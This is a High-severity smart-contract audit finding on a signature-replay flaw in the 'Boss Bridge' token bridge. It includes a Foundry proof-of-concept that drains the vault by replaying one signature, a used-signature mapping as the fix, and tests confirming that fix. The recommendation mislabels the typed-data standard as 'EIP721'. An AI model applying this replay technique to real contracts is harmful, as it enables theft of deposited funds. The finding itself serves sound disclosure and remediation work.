## [High] Unprotected signature leads to a lost of funds

### Severity

High Risk

### Date Modified

Nov 14th, 2023

### Summary

Signatures should be protected in several ways: adding the chainId to identify the valid network, adding a nonce or timestamp to track all signatures, mapping signatures that have already been used...

In this case, we are creating signatures without this type of protection, so that a malicious attacker can drain all the funds in the current L1 network, but probably also in the L2 network if the signatures are validated there in the same way.

### Vulnerability Details (PoC)

In this case, the user `attacker` with a small deposit can create a valid signature, but since there is no trace to confirm that the signature has already been used, the attacker can use it multiple times until all the funds in the vault have been withdrawn.

```
    modifier addFunds() {
        // We set an initial balance using the user already defined:
        vm.startPrank(user);
        uint256 depositAmount = 10e18;

        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);

        assertEq(token.balanceOf(address(vault)), depositAmount);

        vm.stopPrank();

        _;
    }

    function test_attackwithdrawTokensToL1() external addFunds {
        // 1. We have an attacker account with 1 token:
        assertEq(token.balanceOf(attacker), 1e18);

        // 2. The attack starts with a deposit of 1 token:
        vm.startPrank(attacker);
        uint256 attackerDepositAmount = 1e18;
        token.approve(address(tokenBridge), attackerDepositAmount);
        tokenBridge.depositTokensToL2(attacker, attackerInL2, attackerDepositAmount);

        (uint8 v, bytes32 r, bytes32 s) =
            _signMessage(_getTokenWithdrawalMessage(attacker, attackerDepositAmount), operator.key);

        // 3. As the signature is not nonce protected, we can execute as much as we want:
        uint256 vaultBalance = token.balanceOf(address(vault)) / 1e18;

        for (uint256 i; i < vaultBalance; ++i) {
            tokenBridge.withdrawTokensToL1(attacker, attackerDepositAmount, v, r, s);
        }
        vm.stopPrank();

        // 4. Check:
        assertEq(token.balanceOf(address(vault)), 0);
        assertEq(token.balanceOf(attacker) / 1e18, vaultBalance);
    }
```

```
➜  2023-11-Boss-Bridge git:(main) ✗ forge test --mt test_attackwithdrawTokensToL1
[⠒] Compiling...
[⠆] Compiling 3 files with 0.8.20
[⠰] Solc 0.8.20 finished in 1.24s
Compiler run successful!

Running 1 test for test/L1BossBridgeTest.t.sol:L1BossBridgeTest
[PASS] test_attackwithdrawTokensToL1() (gas: 246574)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.49ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)

```

### Impact

The Protocol will lose all its funds.

### Tools Used

Foundry.

### Recommendations

First we need to implement the EIP721 to sign transactions. This ensures that the signature contains all the requirements to be secure: chainId, nonce and a verifiable message.

But we also need to check if the signature has already been used with a mapping:

```
mapping(bytes32 signatures => bool signaturesUsed) public executedSignatures;
```

Now it is time to add all the signatures used to the mapping.

```
function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) public nonReentrant whenNotPaused {
        address signer = ECDSA.recover(MessageHashUtils.toEthSignedMessageHash(keccak256(message)), v, r, s);

        if (!signers[signer]) {
            revert L1BossBridge__Unauthorized();
        }

        (address target, uint256 value, bytes memory data) = abi.decode(message, (address, uint256, bytes));

        //////////////////////
        //    SOLUTION    ///
        /////////////////////
        bytes32 signature = keccak256(abi.encodePacked(v, r, s));
        require(executedSignatures[signature] == false, "Signature already used");
        executedSignatures[signature] = true;
        //////////////////////
        // END SOLUTION    ///
        /////////////////////

        (bool success,) = target.call{ value: value }(data);
        if (!success) {
            revert L1BossBridge__CallFailed();
        }
    }

```

We now add 2 tests:

1. The attacker tries to drain all the funds and fails.
2. The attacker accept defeat and run off only with their deposit.

```
function test_attackTryAndFail() external addFunds {
        // 1. The attack starts with a deposit of 1 token:
        vm.startPrank(attacker);
        uint256 attackerDepositAmount = 1e18;
        token.approve(address(tokenBridge), attackerDepositAmount);
        tokenBridge.depositTokensToL2(attacker, attackerInL2, attackerDepositAmount);

        (uint8 v, bytes32 r, bytes32 s) =
            _signMessage(_getTokenWithdrawalMessage(attacker, attackerDepositAmount), operator.key);

        // 2. Attacker try and fail!!!!
        uint256 vaultBalance = token.balanceOf(address(vault)) / 1e18;

        for (uint256 i; i < vaultBalance; ++i) {
            tokenBridge.withdrawTokensToL1(attacker, attackerDepositAmount, v, r, s);
        }
        vm.stopPrank();
    }
```

```
➜  2023-11-Boss-Bridge git:(main) ✗ forge test --mt test_attackTryAndFail
[⠒] Compiling...
[⠰] Compiling 3 files with 0.8.20
[⠔] Solc 0.8.20 finished in 1.26s
Compiler run successful!

Running 1 test for test/L1BossBridgeTest.t.sol:L1BossBridgeTest
[FAIL. Reason: Signature already used] test_attackTryAndFail() (gas: 190075)
Test result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.60ms

Ran 1 test suites: 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/L1BossBridgeTest.t.sol:L1BossBridgeTest
[FAIL. Reason: Signature already used] test_attackTryAndFail() (gas: 190075)

Encountered a total of 1 failing tests, 0 tests succeeded
```

```
function test_attackerWithdrawAndRun() external addFunds {
        // 2. We have an attacker account with 1 token:
        assertEq(token.balanceOf(attacker), 1e18);

        // 3. The attack starts with a deposit of 1 token:
        vm.startPrank(attacker);
        uint256 attackerDepositAmount = 1e18;
        token.approve(address(tokenBridge), attackerDepositAmount);
        tokenBridge.depositTokensToL2(attacker, attackerInL2, attackerDepositAmount);

        (uint8 v, bytes32 r, bytes32 s) =
            _signMessage(_getTokenWithdrawalMessage(attacker, attackerDepositAmount), operator.key);

        // 4. The signature IS PROTECTED. The attacker decided withdraw their own funds and run:
        uint256 vaultBalance = token.balanceOf(address(vault));

        tokenBridge.withdrawTokensToL1(attacker, attackerDepositAmount, v, r, s);

        vm.stopPrank();

        // 5. Check:
        assertEq(token.balanceOf(address(vault)), vaultBalance - attackerDepositAmount);
        assertEq(token.balanceOf(attacker), attackerDepositAmount);
    }
```

```
➜  2023-11-Boss-Bridge git:(main) ✗ forge test --mt test_attackerWithdrawAndRun
[⠒] Compiling...
No files changed, compilation skipped

Running 1 test for test/L1BossBridgeTest.t.sol:L1BossBridgeTest
[PASS] test_attackerWithdrawAndRun() (gas: 142322)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.74ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
